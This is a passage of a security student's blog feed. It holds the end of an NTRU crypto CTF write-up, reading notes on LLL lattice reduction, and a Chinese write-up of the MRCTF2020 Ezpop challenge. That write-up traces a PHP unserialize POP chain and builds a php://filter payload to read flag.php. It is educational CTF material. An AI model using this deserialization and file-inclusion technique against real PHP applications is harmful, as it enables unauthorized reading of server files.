class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#make.sage</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="built_in">bytearray</span>(<span class="string">&quot;DASCTF&#123;********************************&#125;&quot;</span>.encode())</span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line">length = <span class="built_in">len</span>(flag)</span><br><span class="line">N=<span class="number">53</span></span><br><span class="line">p=<span class="number">257</span></span><br><span class="line">q=<span class="number">28019</span></span><br><span class="line">d=<span class="number">18</span></span><br><span class="line">f=[<span class="number">1</span>]*<span class="number">19</span>+[-<span class="number">1</span>]*<span class="number">18</span>+[<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">random.shuffle(f)</span><br><span class="line">g=[<span class="number">1</span>]*<span class="number">18</span>+[-<span class="number">1</span>]*<span class="number">18</span>+[<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">random.shuffle(g)</span><br><span class="line"></span><br><span class="line">Q.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">P.&lt;y&gt; = Zmod(p)[]</span><br><span class="line">fx=Q(f)</span><br><span class="line">fy=P(f)</span><br><span class="line">gx=Q(g)</span><br><span class="line">Fqx=fx.inverse_mod(x^N-<span class="number">1</span>)</span><br><span class="line">Fpy=fy.inverse_mod(y^N-<span class="number">1</span>)</span><br><span class="line">hx=(Fqx*gx).mod(x^N-<span class="number">1</span>)</span><br><span class="line">r=[<span class="number">1</span>]*<span class="number">10</span>+[-<span class="number">1</span>]*<span class="number">22</span>+[<span class="number">0</span>]*<span class="number">21</span></span><br><span class="line">random.shuffle(r)</span><br><span class="line">rx=Q(r)</span><br><span class="line">mx=Q(flag)</span><br><span class="line">ex=(p*rx*hx+mx).mod(x^N-<span class="number">1</span>)</span><br><span class="line">print(ex)</span><br><span class="line">print(hx)</span><br><span class="line"></span><br><span class="line"><span class="comment">#7367*x^52 + 24215*x^51 + 5438*x^50 + 7552*x^49 + 22666*x^48 + 21907*x^47 + 10572*x^46 + 19756*x^45 + 4083*x^44 + 22080*x^43 + 1757*x^42 + 5708*x^41 + 22838*x^40 + 4022*x^39 + 9239*x^38 + 1949*x^37 + 27073*x^36 + 8192*x^35 + 955*x^34 + 4373*x^33 + 17877*x^32 + 25592*x^31 + 13535*x^30 + 185*x^29 + 9471*x^28 + 9793*x^27 + 22637*x^26 + 3293*x^25 + 27047*x^24 + 21985*x^23 + 13584*x^22 + 6809*x^21 + 24770*x^20 + 16964*x^19 + 8866*x^18 + 22102*x^17 + 18006*x^16 + 3198*x^15 + 19024*x^14 + 2777*x^13 + 9252*x^12 + 9684*x^11 + 3604*x^10 + 7840*x^9 + 17573*x^8 + 11382*x^7 + 12726*x^6 + 6811*x^5 + 10104*x^4 + 7485*x^3 + 858*x^2 + 15100*x + 15860</span></span><br><span class="line"><span class="comment">#14443*x^52 + 10616*x^51 + 11177*x^50 + 24769*x^49 + 23510*x^48 + 23059*x^47 + 21848*x^46 + 24145*x^45 + 12420*x^44 + 1976*x^43 + 16947*x^42 + 7373*x^41 + 16708*x^40 + 18435*x^39 + 18561*x^38 + 21557*x^37 + 16115*x^36 + 7873*x^35 + 20005*x^34 + 11543*x^33 + 9488*x^32 + 2865*x^31 + 11797*x^30 + 2961*x^29 + 14944*x^28 + 22631*x^27 + 24061*x^26 + 9792*x^25 + 6791*x^24 + 10423*x^23 + 3534*x^22 + 26233*x^21 + 14223*x^20 + 15555*x^19 + 3381*x^18 + 23641*x^17 + 2697*x^16 + 11303*x^15 + 6030*x^14 + 7355*x^13 + 20693*x^12 + 1768*x^11 + 10059*x^10 + 27822*x^9 + 8150*x^8 + 5458*x^7 + 21270*x^6 + 22651*x^5 + 8381*x^4 + 2819*x^3 + 3987*x^2 + 8610*x + 6022</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;orz 还是太菜了，这个比赛密码都被A穿了，我还是做不出NTRU，师傅们都说简单，多项式杀我&lt;br&gt;还是详细记录一下吧，加油&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-crypto-threshold&quot;&gt;&lt;a href=&quot;#0x</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="NTRU" scheme="http://tearsjin.github.io/tags/NTRU/"/>
    
    <category term="Stream" scheme="http://tearsjin.github.io/tags/Stream/"/>
    
  </entry>
  
  <entry>
    <title>Reading notes An Introduction to Lenstra-Lenstra-Lovasz Lattice Basis Reduction Algorithm</title>
    <link href="http://tearsjin.github.io/2021/03/25/Reading-notes-An-Introduction-to-Lenstra-Lenstra-Lovasz-Lattice-Basis-Reduction-Algorithm/"/>
    <id>http://tearsjin.github.io/2021/03/25/Reading-notes-An-Introduction-to-Lenstra-Lenstra-Lovasz-Lattice-Basis-Reduction-Algorithm/</id>
    <published>2021-03-25T07:59:45.000Z</published>
    <updated>2021-03-26T13:11:39.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>Definition 1.1</strong>(Lattice). A lattice $\mathcal L$ is a discrete subgroup of $H$ generated by all the integer combinations of the vectors of some basis $B$ :<br>$$<br>\mathcal L = \sum^m_{i=1}\mathbb Zb_i = \lbrace \sum^m_{i=1}z_ib_i, where \ z_i \in \mathbb Z,b_i \in B \rbrace .<br>$$<br><strong>Theorem 1.1</strong> (Minowski’s Theorem). Any convex, centrally symmetric body $S$ of volume $vol(S) &gt; 2^ndet(\mathcal L)$ contains a non-zero lattice point. $det(\mathcal L)$ is the determinant of a lattice $\mathcal L$ .</p><p><strong>Definition 1.2</strong> (Fundamental Region). A set $\mathcal F \subseteq \mathbb R^n$ of a lattice $\mathcal F$ if its translation $x+\mathcal F = {x+y:y \in \mathcal F}$,taken over all $x \in \mathcal L$, form a partition of $\mathbb R^n$.</p><p><strong>Corollary 1.1.1</strong> For any n-dimensional lattice $\mathcal L$, we have the length of shortest vector $\lambda(\mathcal L) &gt; \sqrt n \cdot det(\mathcal L)^{1 \over n}$</p><h1 id="Basis-Reduction"><a href="#Basis-Reduction" class="headerlink" title="Basis Reduction"></a>Basis Reduction</h1><p>​    Basis reduction is a process of reducing the basis $B$ of a lattice $\mathcal L$ to a shorter basis $B’$ while keeping $\mathcal L$ the same.</p><p>​    There are some ways to change the basis but keep the same lattice :</p><pre><code>      1. Swap two vectors in the basis.      2. For a vector $b_i \in B $, use $-b_i$ instead.      3. For a vector $b_i \in B$, add a linear combination of other basis vectors to it.</code></pre><p>Basis reduction can help solving SVP, because if we can not reduce a basis anymore, the shortest basis vector should be the shortest vector of the lattice.</p><p>Now we start by solving the SVP in 2-dimensional case.</p><p><strong>Definition 2.1</strong> (Two dimensional reduced basis). A basis $(b_1,b_2)$ is said to be reduced if it satisfies following condition:<br>$$<br>|| b_1 || \leq || b_2 || \\<br>u = {b_1 \cdot b_2 \over ||b_1||^2} \leq {1\over 2}<br>$$<br>with the $u$ is called the orthogonal projection coefficient.</p><p><strong>Theorem 2.1</strong>. Given a two dimensional lattice $\mathcal L$ with basis rank 2, if $\lambda$ is the length of the shortest vector in $\mathcal L$, then<br>$$<br>\lambda \leq \sqrt { {2 \over \sqrt3}det(\mathcal L)}.<br>$$<br><strong>Theorem 2.2</strong> if a basis ${b_1,b_2}$ is reduced, then $b_1$ is the shortest vector. </p><blockquote><p>​    About the Definition 2.1 and Theorem 2.1 , 2.2 , I think when we can say we find the shortest vector $b_1$, the basis $(b_1,b_2)$ is said “already be reduced”. And it means that this basis satisfies the condition in the <strong>Definition 2.1</strong>.<br>​    So, if $u &gt; {1\over 2}$, the basis can be reduced continued.</p></blockquote><p>The description of Gauss’s algorithm solved SVP in 2-dimensional.</p><ol><li>Start with basis ${b_1,b_2}$, if $||b_1|| &gt; ||b_2||$. swap  $b_1$ and $b_2$.</li><li>Compute $u = {b_1 \cdot b_2 \over ||b_1||^2}.$If $u&gt;{1\over 2}$. let $m$ be the biggest integer that is smaller than $u$, and let $b_2 = b_2 - mb_1.$</li><li>If $||b_1|| &gt; ||b_2||$, then swap $b_1$ and $b_2$, and repeat step 2. Otherwise, output $b_1$ </li></ol><blockquote><p>According the algorithm above, I write the following script with the Sagemath.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Gauss_2d_reduce</span>(<span class="params">basis</span>):</span></span><br><span class="line">    (b1,b2) = (basis[<span class="number">0</span>],basis[<span class="number">1</span>]) <span class="keyword">if</span> basis[<span class="number">0</span>].norm() &lt; basis[<span class="number">1</span>].norm() <span class="keyword">else</span> (basis[<span class="number">1</span>],basis[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        u = (b1[<span class="number">0</span>]*b2[<span class="number">0</span>] + b1[<span class="number">1</span>]*b2[<span class="number">1</span>]) / b1.norm()^<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> u &gt; <span class="number">0.5</span>:</span><br><span class="line">            m = <span class="built_in">int</span>(u)</span><br><span class="line">            b2 = b2 - m*b1</span><br><span class="line">        <span class="keyword">if</span> b1.norm() &gt; b2.norm():</span><br><span class="line">            b1,b2 = b2,b1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span>([b1,b2])</span><br></pre></td></tr></table></figure><p>The basis we found in Gauss algorithm is not exactly orthogonal, but it is the nearest basis we can get.</p><h1 id="Gram-Schmidt-Orthogonalization"><a href="#Gram-Schmidt-Orthogonalization" class="headerlink" title="Gram-Schmidt Orthogonalization"></a>Gram-Schmidt Orthogonalization</h1><p>To generalize the algorithm to n-dimensions, we need to find a way to construct n-dimensional orthogonal basis based on the given basis, which leads us to Gram-Schmidt Orthogonalization.</p><p><strong>Theorem 3.1</strong> (Gram-Schmidt Orthogonalization method). Given a basis $\{b_1,b_2,\cdots,b_m\}$ of a subspace $H_m$ of $\mathbb R^n$, we define<br>$$<br>b_1^* = b_1 \\<br>b_2^*=b_2 - u_{1,2}b_1, \ \ \ \ \ \ u_{1,2} = {b_2 \cdot b_1^* \over b_1^* \cdot b_1^*} \\<br>\vdots \\<br>b_m^* = b_m - \sum_{i&lt;m}u_{i,m}b_i \ \ \ \ \ \ u_{i,m} = {b_m \cdot b_i^* \over b_i^* \cdot b_i^*} \\<br>$$<br>Then, $ \{b_1^*,b_2^*,\cdots,b_m^*\} $ is an orthogonal basis of $H_m$. </p><p>Based on this Theorem, if we set $u_{m,m} = 1$, then we have<br>$$<br>b_m = \sum ^m_{i=1}u_{i,m}b_i<br>$$<br>Therefore, we can write the above formula in matrix form, $ B = B^*U $. </p><p>where basis vectors are columns in $B$ and $B^*$. Thus, we have<br>$$<br>U = \begin{pmatrix}<br>u_{1,1}&amp;u_{1,2}&amp;\cdots&amp;u_{1,n} \\<br>0&amp;u_{2,2}&amp;\cdots&amp;u_{2,n} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;u_{n,n} \\<br>\end{pmatrix}<br>=<br>\begin{pmatrix}<br>1&amp;u_{1,2}&amp;\cdots&amp;u_{1,n} \\<br>0&amp;1&amp;\cdots&amp;u_{2,n} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;1 \\<br>\end{pmatrix}<br>$$<br>Obviously, we can know that $det(U) = 1$</p><blockquote><p>For better understanding the matrix , let’s write the matrix at length.</p><p><del>but before write down the matrix, I want to translate the formula in the Theorem 3.1.</del></p><p>$$<br>(b_1,b_2,\cdots,b_n)<br>\begin{pmatrix}<br>1&amp;u_{1,2}&amp;\cdots&amp;u_{1,n} \\<br>0&amp;1&amp;\cdots&amp;u_{2,n} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;1 \\<br>\end{pmatrix} = (b_1^*,b_2^*,\cdots,b_n^*)<br>$$<br>I can’t understand! why $B = B^*U$ ????? </p></blockquote><h1 id="LLL-Basis-Reduction"><a href="#LLL-Basis-Reduction" class="headerlink" title="LLL Basis Reduction"></a>LLL Basis Reduction</h1><p><strong>Definition 4.1</strong> (LLL reduced basis). Let$\{b_1,b_2,\cdots,b_n\}$ be a basis for a n-dimensional Lattice $\mathcal L$ , and $\{b_1^{∗},b_2^{∗},\cdots,b_n^{∗}\}$ be the orthogonal basis generated in Theorem 3.1, and we have $u_{i,k}={b_k \cdot b_i^{∗} \over b_i^{∗} \cdot b_i^{∗}}$. We say $\{b_1,b_2,\cdots,b_n\}$ is a LLL reduced basis if it satisfies two conditions:</p><p>(1) $\forall i \ne k, u_{i,k} \le {1\over 2},$<br>(2) For each $i, ||b_{i+1}^{∗} + u_{i,i+1}b_i^{∗}||^2 \ge {3\over 4}||b_i^{∗}||^2$</p><p><em>Remark</em>. The constant $3\over 4$ is chosen for the simplicity of the paper. Any constant between $1\over 4$ and 1 can guarantee that the algorithm terminates in polynomial time.</p><p><em>Remark</em>. The condition 2 emphasizes the ordering of the basis, like what we did in two dimensional case.</p><p>Given a basis $\{b_1,b_2,\cdots,b_n\}$ in n-dimension, to get a LLL reduced basis, the LLL algorithm works as below.</p><p><img src="http://47.98.130.190:8090/upload/2021/03/1616724105(1)-e7f3a7c1aa0d4556bc0474fc55d46791.jpg" alt="LLL Algorithm"></p><blockquote><ul><li><p>Step 1: Computed the most orthogonal basis based on Gram-Schmidt orthogonalization.</p></li><li><p>Step 2: Check the second condition.</p><p>Because I don’t know how to choose the constant, I run the LLL Algorithm four times with different constants for one output.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LLL_Algorithm</span>(<span class="params">Lattice,constant=<span class="number">1</span>/<span class="number">4</span></span>):</span></span><br><span class="line">    n = <span class="built_in">len</span>(Lattice[<span class="number">0</span>])</span><br><span class="line">    quickSort(Lattice,<span class="number">0</span>,n-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        finish = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,i):</span><br><span class="line">                m = <span class="built_in">int</span>((Lattice[i-<span class="number">1</span>]*Lattice[k-<span class="number">1</span>]) / (Lattice[k-<span class="number">1</span>] * Lattice[k-<span class="number">1</span>]))</span><br><span class="line">                Lattice[i-<span class="number">1</span>] = Lattice[i-<span class="number">1</span>] - m * Lattice[k-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">            u = (Lattice[i+<span class="number">1</span>]*Lattice[i]) / (Lattice[i] * Lattice[i])</span><br><span class="line">            <span class="keyword">if</span> ((Lattice[i+<span class="number">1</span>]+u*Lattice[i]).norm())^<span class="number">2</span> &lt; ((constant) * (Lattice[i].norm())^<span class="number">2</span>):</span><br><span class="line">                Lattice[i],Lattice[i+<span class="number">1</span>] = Lattice[i+<span class="number">1</span>],Lattice[i]</span><br><span class="line">                finish = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> finish:</span><br><span class="line">            <span class="keyword">if</span> contant == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> Lattice</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> LLL_Algorithm(Lattice,constant+(<span class="number">1</span>/<span class="number">4</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partition</span>(<span class="params">Lattice, low, high</span>):</span></span><br><span class="line">    i = (low - <span class="number">1</span>)</span><br><span class="line">    pivot = Lattice[high].norm()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">        <span class="keyword">if</span> Lattice[j].norm() &lt;= pivot:</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            Lattice[i], Lattice[j] = Lattice[j], Lattice[i]</span><br><span class="line">    Lattice[i + <span class="number">1</span>], Lattice[high] = Lattice[high], Lattice[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> (i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quickSort</span>(<span class="params">Lattice, low, high</span>):</span></span><br><span class="line">    <span class="keyword">if</span> low &lt; high:</span><br><span class="line">        pi = partition(Lattice, low, high)</span><br><span class="line">        quickSort(Lattice, low, pi - <span class="number">1</span>)</span><br><span class="line">        quickSort(Lattice, pi + <span class="number">1</span>, high)</span><br></pre></td></tr></table></figure></li></ul></blockquote><p><strong>Claim 4.1</strong>. If $\{b_1,b_2,\cdots,b_n\}$ is a n-dimensional LLL reduced basis of Lattice $\mathcal L$, then $||b_1|| \le 2^{n-1 \over 2 }\lambda(\mathcal L)$ is the length of the shortest  vector of $\mathcal L$.</p><blockquote><p>In this paper, the author proof the LLL algorithm terminates in polynomial time of $n$ in the next part. If you want to know how to proof that, you can read the original paper. </p></blockquote><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><blockquote><p>I think this paper make me understand the LLL Algorithm easily, but I want to know more detail about the LLL Algorithm.  If I have time, I would like to see the original paper about LLL!  -&gt; <a href="https://link.springer.com/content/pdf/10.1007/BF01457454.pdf">https://link.springer.com/content/pdf/10.1007/BF01457454.pdf</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Definition 1.1&lt;/strong</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Noting of [MRCTF2020]Ezpop</title>
    <link href="http://tearsjin.github.io/2021/03/25/Noting-of-MRCTF2020-Ezpop/"/>
    <id>http://tearsjin.github.io/2021/03/25/Noting-of-MRCTF2020-Ezpop/</id>
    <published>2021-03-25T03:32:21.000Z</published>
    <updated>2021-03-27T11:39:11.946Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这个链子有够长的</p></blockquote><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>主要考察:</p><ol><li>反序列化魔术方法</li><li>文件包含伪协议</li></ol><p>这两部分可以找反序列化笔记和文件包含笔记</p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>代码不长直接贴出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>开头提示给了flag在<code>flag.php</code>中, 所以要想办法读取他.<br>大概看了一遍, 发现个<code>Modifier.append()</code>里面有个<code>include()</code>, 要想办法调用它. 而在同个类中定义了魔术方法<code>__invoke()</code>会调用<code>append()</code>. 要想调用<code>__invoke()</code>, 就要把对象当成是函数进行调用. </p><p>分析到这里先断开, 因为我们还不知道到底有啥办法开始函数链的调用.</p><p>代码里面只有一行<code>@unserialize($_GET[&#39;pop&#39;]);</code>, 要想在反序列化后进行更多操作, 估计是需要一个<code>__wakeup()</code>的, 而类<code>Show</code>是定义了<code>__wakeup()</code>, 而这个<code>__wakeup()</code>中只存在一个调用<code>$this-&gt;source = &quot;index.php&quot;;</code>, 这是一个对字符串的操作, 可以马上想到<code>__toString()</code></p><p>而类<code>Show</code>中同样有<code>__toString()</code>, 继续看下去, <code>__toString()</code>里依然只有一个调用<code>return $this-&gt;str-&gt;source;</code><br>这里可以调用一个变量, 要想到<code>__get()</code>, 刚好类<code>Test</code>中有<code>__get()</code>, 而这个<code>__get()</code>就提供了一个函数调用的入口.</p><p>到了这里我们就找到了一个调用链:</p><p><code>@unserialize($_GET[&#39;pop&#39;])</code> -&gt; <code>Show.__wakeup()</code> -&gt; <code>Show.__toString()</code> -&gt; <code>Test.__get()</code> -&gt; <code>Modifier.__invoke()</code> -&gt; <code>Modifier.appen()</code> -&gt; <code>include()</code></p><h1 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h1><p>我们跟着调用链一步一步构造即可, 这里还需要注意一下, 因为是要包含一个php文件, 直接包含会直接执行, 那么里面的变量就看不到了, 要用<code>php:\\filter</code>讲文件base64编码再包含进来. </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span> = <span class="string">&#x27;ftp&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Modifier;</span><br><span class="line"><span class="variable">$c</span>-&gt;p = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>得到payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 